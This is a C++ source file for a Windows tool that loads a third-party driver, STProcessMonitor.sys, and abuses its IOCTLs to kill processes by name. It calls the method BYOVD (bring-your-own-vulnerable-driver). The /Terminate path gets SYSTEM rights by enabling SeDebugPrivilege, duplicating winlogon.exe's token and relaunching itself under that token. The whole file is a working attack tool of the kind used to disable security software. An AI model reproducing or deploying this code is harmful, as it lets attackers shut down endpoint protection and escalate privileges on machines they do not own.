#include <Windows.h>
#include <iostream>
#include <conio.h>
#include "Functions.h"
#include "Struct.h"

int main(int argc, char** argv) {
	TCHAR CurrentExePath[MAX_PATH];
	GetModuleFileName(NULL, CurrentExePath, MAX_PATH);
	std::wstring FullExePath(CurrentExePath);
	size_t pos = FullExePath.find_last_of(L"\\/");
	std::wstring dir = FullExePath.substr(0, pos);
	std::wstring DrvName = L"\\STProcessMonitor.sys";
	std::wstring FullDriverPath = dir + DrvName;
	LPCWSTR ServiceName = L"STProcessMonitor";

	if (argc == 2 && strcmp(argv[1], "/Init") == 0) {
		std::wcout << "[!]Driver is Loading from " << FullDriverPath << std::endl;
		if (!LoadDriver(ServiceName, FullDriverPath.c_str())) {
			std::cerr << "[-]Failed to load driver." << std::endl;
			return -1;
		}
		std::cout << "[+]Load driver success! Now you can use BYOVD to kill processes." << std::endl;
		return 0;
	}

	if (argc == 2 && strcmp(argv[1], "/Uninst") == 0) {
		if (!UnloadDriver(ServiceName)) {
			std::cerr << "[-]Failed to Unload driver." << std::endl;
			return -1;
		}
		std::cout << "[+]Unload routine completed." << std::endl;
		return 0;
	}

	if (argc >= 2 && strcmp(argv[1], "/Kill") == 0) {
		HANDLE hDevice = INVALID_HANDLE_VALUE;
		hDevice = CreateFile(L"\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
		if (hDevice == INVALID_HANDLE_VALUE) {
			std::cerr << "[-]Open Device Failed with code " << GetLastError() << std::endl;
			return GetLastError();
		}
		std::cout << "[+]Open Device handle at 0x" << std::hex << hDevice << std::endl;

		int i;
		for (i = 2; i < argc; i++) {
			int len = MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, NULL, 0);
			std::wstring result(len - 1, L'\0'); //Exclude null terminator
			MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, &result[0], len);
			auto pids = FindProcessIdsByName(result);
			for (DWORD pid : pids) {
				TerminateProcessInfo PInfo = { 0 };
				PInfo.ProcessId = (HANDLE)pid;
				std::wcout << "[!]Terminating " << result << " " << pid << std::endl;
				DWORD BytesReturned;
				if (!DeviceIoControl(hDevice, 0xB822200C, &PInfo, sizeof(PInfo), NULL, NULL, &BytesReturned, NULL)) {
					std::cerr << "[-]Failed to Operate with code " << GetLastError() << std::endl;
				}
			}
		}
		std::cout << "[!]Operate Completed." << std::endl;
		return 0;
	}

	if (argc >= 2 && strcmp(argv[1], "/Terminate") == 0) {
		std::cout << "[!]Notice: This program is using new driver and needs NT Authority/SYSTEM." << std::endl;
		HANDLE hToken = NULL;
		DWORD dwSize = 0;
		PTOKEN_USER pTokenUser = NULL;
		if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
			std::cerr << "[-]Failed to verify if is SYSTEM." << GetLastError() << std::endl;
			return -1;
		}

		GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
		if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
			CloseHandle(hToken);
			return -2;
		}
		pTokenUser = (PTOKEN_USER)malloc(dwSize);
		if (!pTokenUser) {
			CloseHandle(hToken);
			return -2;
		}
		if (!GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
			std::cerr << "[-]Failed to Get Current Token " << GetLastError() << std::endl;
			CloseHandle(hToken);
			return -2;
		}
		std::cout << "[+]Get Current Token Success!" << std::endl;

		BYTE systemSid[SECURITY_MAX_SID_SIZE];
		DWORD cbSystemSid = sizeof(systemSid);
		CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &cbSystemSid);
		if (EqualSid(pTokenUser->User.Sid, systemSid)) {
			std::cout << "[+]Process is running under SYSTEM!" << std::endl;
			HANDLE hDevice = INVALID_HANDLE_VALUE;
			hDevice = CreateFile(L"\\\\.\\STProcessMonitorDriver", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
			if (hDevice == INVALID_HANDLE_VALUE) {
				std::cerr << "[-]Open Device Failed with code " << GetLastError() << std::endl;
				return GetLastError();
			}
			std::cout << "[+]Open Device handle at 0x" << std::hex << hDevice << std::endl;

			int i;
			for (i = 2; i < argc; i++) {
				int len = MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, NULL, 0);
				std::wstring result(len - 1, L'\0'); //Exclude null terminator
				MultiByteToWideChar(CP_UTF8, 0, argv[i], -1, &result[0], len);
				auto pids = FindProcessIdsByName(result);
				for (DWORD pid : pids) {
					TerminateProcessInfo PInfo = { 0 };
					PInfo.ProcessId = (HANDLE)pid;
					std::wcout << "[!]Terminating " << result << " " << pid << std::endl;
					DWORD BytesReturned;
					if (!DeviceIoControl(hDevice, 0xB822A00C, &PInfo, sizeof(PInfo), NULL, NULL, &BytesReturned, NULL)) {
						std::cerr << "[-]Failed to Operate with code " << GetLastError() << std::endl;
					}
				}
			}
			std::cout << "[!]Operate Completed. Press any key to close this window." << std::endl;
			_getch();
			return 0;
		}

		//IF not SYSTEM
		if (!EnableSeDebugPrivilege()) {
			std::cerr << "[-]Failed to Enable SeDebugPrivilege" << std::endl;
			return -1;
		}

		auto WinLogonPids = FindProcessIdsByName(L"winlogon.exe");
		DWORD FinalPid = 0;
		for (DWORD pid : WinLogonPids) {
			HANDLE hProcess = NULL;
			HANDLE hToken = NULL;
			PTOKEN_USER pTokenUser = NULL;
			DWORD dwSize = 0;
			hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
			if (!hProcess) {
				std::cerr << "[-]Failed to open winlogon process " << GetLastError() << std::endl;
				return -2;
			}
			if (!OpenProcessToken(hProcess, TOKEN_QUERY, &hToken)) {
				std::cerr << "[-]Failed to Get WinLogon Token " << GetLastError() << std::endl;
				CloseHandle(hProcess);
				return -2;
			}
			GetTokenInformation(hToken, TokenUser, NULL, 0, &dwSize);
			pTokenUser = (PTOKEN_USER)malloc(dwSize);

			if (pTokenUser && GetTokenInformation(hToken, TokenUser, pTokenUser, dwSize, &dwSize)) {
				BYTE systemSid[SECURITY_MAX_SID_SIZE];
				DWORD cbSystemSid = sizeof(systemSid);
				if (CreateWellKnownSid(WinLocalSystemSid, NULL, systemSid, &cbSystemSid)) {
					if (EqualSid(pTokenUser->User.Sid, systemSid)) {
						std::cout << "[+]Find winlogon.exe process with SYSTEM priviledge, PID: " << pid << std::endl;
						FinalPid = pid;
						CloseHandle(hToken);
						CloseHandle(hProcess);
						break;
					}
				}
			}
			CloseHandle(hToken);
			CloseHandle(hProcess);
		}
		if (FinalPid == 0) {
			std::cerr << "[-]Failed to retrieve matched winlogon process." << std::endl;
			return -2;
		}

		HANDLE hWinLogon= OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, FinalPid);
		HANDLE hSystemToken = NULL;
		OpenProcessToken(hWinLogon, TOKEN_DUPLICATE, &hSystemToken);
		HANDLE hNewToken = NULL;
		DuplicateTokenEx(hSystemToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hNewToken);
		STARTUPINFOW si = { sizeof(si) };
		PROCESS_INFORMATION pi = { 0 };
		LPWSTR cmdLine = GetCommandLineW();
		if (!CreateProcessWithTokenW(hNewToken, LOGON_WITH_PROFILE, NULL, cmdLine, 0, NULL, NULL, &si, &pi)) {
			std::cerr << "[-]Failed to Create new NT Authority/SYSTEM process with code " << GetLastError() << std::endl;
			CloseHandle(hNewToken);
			CloseHandle(hSystemToken);
			CloseHandle(hWinLogon);
			return -3;
		}
		std::cout << "[+]Create SYSTEM Process success, PID: " << pi.dwProcessId << std::endl;
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
		CloseHandle(hNewToken);
		CloseHandle(hSystemToken);
		CloseHandle(hWinLogon);
		return 1;
	}

	std::cout << "Usage: " << std::endl;
	std::cout << "  /Init - Load STProcessMonitor Driver" << std::endl;
	std::cout << "  /Kill <ProcessName 1> <ProcessName 2> ... - Terminate processes by ProcessName, using exist DriverService." << std::endl;
	std::cout << "  /Terminate <ProcessName 1> <ProcessName 2> ... - Terminate process by name, using updated driver." << std::endl;
	std::cout << "  /Uninst - Unload driver" << std::endl;
	return 0;
}